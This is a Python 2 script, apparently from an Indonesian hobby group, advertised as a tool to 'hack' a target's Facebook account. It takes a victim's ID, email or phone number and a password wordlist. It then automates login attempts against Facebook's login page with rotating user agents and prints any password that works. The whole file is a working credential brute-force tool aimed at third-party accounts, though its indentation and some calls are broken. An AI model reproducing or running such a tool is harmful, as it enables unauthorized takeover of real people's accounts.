#!usr
# -*- coding: UTF-8 -*-
# Mod by: Luter
# team: life of programmer


import os
import sys
import time
import random
import cookielib
import mechanize

os.system("clear")

wd = "\033[90;1m" # dark
GL = "\033[96;1m" # Blue aqua
BB = "\033[34;1m" # Blue light
YY = "\033[33;1m" # Yellow light
GG = "\033[32;1m" # Green light
WW = "\033[0;1m"  # White light
RR = "\033[31;1m" # Red light
CC = "\033[36;1m" # Cyan light
B = "\033[34m"    # Blue
Y = "\033[33;1m"    # Yellow
G = "\033[32m"    # Green
W = "\033[0;1m"     # White
R = "\033[31m"    # Red
C = "\033[36;1m"    # Cyan

def runntxt(s):
        for noobs in s + '\n':
                sys.stdout.write(noobs)
                sys.stdout.flush()
                time.sleep(10. / 2100)


def banner():
    os.system('clear')
    print " "
    runntxt(GL+"              Assalamu'@laikum. ^_^")
    print " "
    runntxt(WW+"            _          _")
    runntxt(WW+"  	   | |   _   _| |_ ___ _ __")
    runntxt(GL+"      	   | |  | | | | __/ _ \ '__|")
    runntxt(GG+"           | |__| |_| | ||  __/ |")
    runntxt(Y+"    	   |_____\__,_|\__\___|_|")
    time.sleep(1.5)
    print " "
    runntxt(GG+"  √==============================================√")
    runntxt(GL+"  |••••••   NEW TOOLS HACK FACEBOOK TARGET ••••••|")
    runntxt(GG+"  √==============================================√")
    runntxt(WW+"  |                MOD BY: Luter                 |")
    runntxt(WW+"  |              FACEBOOK: Lutr Lutr             |")
    runntxt(Y+"  |              YOUTUBE : trio                  |")
    runntxt(Y+"  |              WhatsApp : 083122674xxx         |")
    runntxt(GL+"  |        Berdoa Dulu Sebelum Menggunakan       |")
    runntxt(GL+"  |----------------------------------------------|")
    runntxt(GL+"  |         LIFE OF PROGRAMMER [ W.E.N ]         |")
    runntxt(GL+"  |----------------------------------------------|")
    runntxt(GG+"  √==============================================√")
    runntxt(BB+"  |0101010101010   WARONG ETANAN   10101010101010|")
    runntxt(GG+"  √==============================================√")

banner()

print wd+"     => https://www.github.com/WarongEtan/luter <="
print GG+"╭────\033[91m[\033[33m Masukkan ID\033[96m / \033[31mEmail\033[96m / \033[32mTelepon / \033[34mUsername Target\033[91m ] "
email_target = str(raw_input(GL+"\033[92m╰────➲\033[93m  "))
print " "
print "\033[92m╭────\033[91m[ \033[96mMasukkan File Password\033[95m( /sdcard/file password.txt ) \033[91;1m]"
password_list = str(raw_input(GG+"╰────➲\033[93m "))
login = 'https://www.facebook.com/login.php?login_attempt=1'
useragents = [('Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0','Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Geck')]
 useragents = [('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36','Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36','Mozilla/5.0 (Windows NT 5.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36','Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36','Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36','Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36','Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36','Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36',)]

def pil():
                print GG+" "
                g = str(raw_input("[?] Jajal Neh Ora..\033[93;1m[y/o]: "))
                if g == 'y' or g == 'Y':
                    os.system('python2 luter.py')
                elif g == 'o' or g == 'O':
                    print wd+"Wes Bosen Cok..."
                    sys.exit()
                else:
                    print RR+"Di Woco Cok..."
                    pil()

def edit_password():

        print GG+" "
        ed = str(raw_input("[?] Gawe Password Cok.? \033[96;1m[y/o]: "))
        if ed == 'y' or ed == 'Y':
                os.system('nano '+password_list)
                pil()
        elif ed == 'n' or ed == 'O':
                print wd+"Putus Ae Wes Ra Dianggep"
                sys.exit()

        else:
                print RR+"Wedok Akeh Cok..."
                edit_password()

def main():
        global noobs
        noobs = mechanize.Browser()
        cj = cookielib.LWPCookieJar()
        noobs.set_handle_robots(False)
        noobs.set_handle_redirect(True)
        noobs.set_cookiejar(cj)
        noobs.set_handle_equiv(True)
        noobs.set_handle_referer(True)
        noobs.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
        runn_noobs()
        life()
        print " "
        print RR+" Password Ora Cocok...."
        print " "
def lutr(luter_password):
  try:
 	sys.stdout.write(GG+"\n[\033[91m+\033[92m]\033[91;1m [\033[97m"+email_target+"\033[91m]\033[90m Njajali ==> \033[91m[\033[90;1m"+luter_password)
	sys.stdout.flush()
	noobs.addheaders = [('User-agent', random.choice(useragents))]
	site = noobs.open(login)
	noobs.select_form(nr = 0)
	noobs.form['email'] = email_target
	noobs.form['pass'] = luter_password
	tom = noobs.submit()
	mask = tom.geturl()
	if mask != login and (not 'login_attempt' in mask):
                        print " "
                         
                        
			print(GL+"                           S U C C E S S")
			print(R+"                     P A S S W O R D  B E T U L")
                  	print RR+"+----------------------------------------------------------+"
	         	print (RR+"√\033[97m ID / Email Target:\033[92m {}").format(email_target)
        	        print (RR+"√\033[97m Password Target:\033[92m {}").format(luter_password)
        	        print " "
        	        raw_input(WW+"TEKAN ENTER NGGO METU..")
			sys.exit(1)
  
  
  except KeyboardInterrupt:
      print wd+"Stop......."
      edit_wordlist()
      sys.exit()    	    
def life():
	global luter_password
	password_nob = open(password_list, "r")
	for luter_password in password_nob:
		password_nob = luter_password.replace("\n","")
		lutr(luter_password)		

def runn_noobs():
         global password_list

         lop = GG+"""

                  `.-://////:-.`
              .:+o+:-..````..-:+o+:.
           `:o+-`                `:+o:`
         `/o:`                      `:o/`
        -s/`  .-..`            `..--` `/s-
       /o.   `:.`.-:----------:-.``:-   .o/
      /o`    .:`    `              --    `o/
     -s.     .:`                   --     .s-
     o/     .:`                     --     +o
    .s-     :.        WaronG        `:`    -s`
    .s.     :.         EtaN         `:`    .s.
    .s-     --                      .:     -s.
     o/     `-.                    `-.     /o
     -s.     `--`                `.-`     .s-
      /o` ----``..--..`    `...--.`      `o/
       /o. `----`  `-.      `-.         .o/
        -o:  -.......        ..       `:o-
         `:o:``....--        ..     `:o:`
           `:+/-`  `-        ..  `-/+:`
              `-/+///..````..://+/-`
                  `.-::////::-.` \033[91;1m

                \033[90;1mLife Of Programmer\033[91;1m
             Powered by:\033[97m Luter
      """


         print lop
         nuub = open(password_list, 'r')
         nuub = nuub.readlines()
         print wd+" [➡]  Email / Telepon\033[97;1m: {}".format(email_target)
         print wd+" [➡] Kabeh Password Gawekanem\033[97;1m:", len(nuub),'password'
         print wd+" [➡] Nteni Lagi Njajali Pas Opo Ora\033[97;1m.........."
         print " "

if __name__=='__main__':
	main()	